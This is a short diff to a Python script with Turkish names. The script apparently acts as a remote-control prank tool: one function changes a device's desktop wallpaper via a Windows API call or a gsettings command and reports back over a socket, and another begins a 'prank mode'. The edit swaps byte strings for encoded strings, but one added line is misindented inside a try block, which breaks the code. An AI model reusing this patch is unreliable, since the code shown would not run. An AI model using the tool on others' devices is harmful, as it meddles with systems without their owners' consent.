@@ -27,9 +27,9 @@ def arkaplan_degistir(url):
             ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
         elif cihaz == "Linux PC":
             os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
-        s.send(b"[✓] Arka plan degistirildi\n")
+  s.send("[✓] Arka plan degistirildi\n".encode())
     except:
-        s.send(b"[!] Arka plan degistirilemedi\n")
+        s.send("[!] Arka plan degistirilemedi\n".encode())
 
 def saka_modu(mesaj):
     if cihaz == "Telefon":
